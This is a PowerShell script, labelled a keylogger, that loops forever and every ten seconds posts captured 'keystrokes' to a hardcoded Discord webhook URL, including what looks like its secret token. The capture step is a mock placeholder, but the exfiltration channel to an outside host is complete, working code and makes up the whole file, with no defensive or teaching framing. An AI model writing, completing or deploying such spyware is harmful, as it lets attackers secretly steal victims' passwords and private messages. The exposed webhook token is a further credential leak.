# Define Discord webhook URL
$discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"

# Define function to send message via Discord webhook
function Send-DiscordMessage {
    param (
        [string]$Content
    )

    try {
        $body = @{
            content = $Content
        } | ConvertTo-Json

        Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
    }
    catch {
        Write-Host "Error occurred: $_"
    }
}

# Define function to log keystrokes and send via Discord webhook
function KeyLogger {
    while ($true) {
        Start-Sleep -Seconds 10  # Adjust sleep time as needed

        # Get keystrokes here (replace this with your keylogging logic)
        $keystrokes = "Mock keystrokes"

        # Send keystrokes via Discord webhook
        Send-DiscordMessage -Content $keystrokes
    }
}

# Run keylogger function
KeyLogger
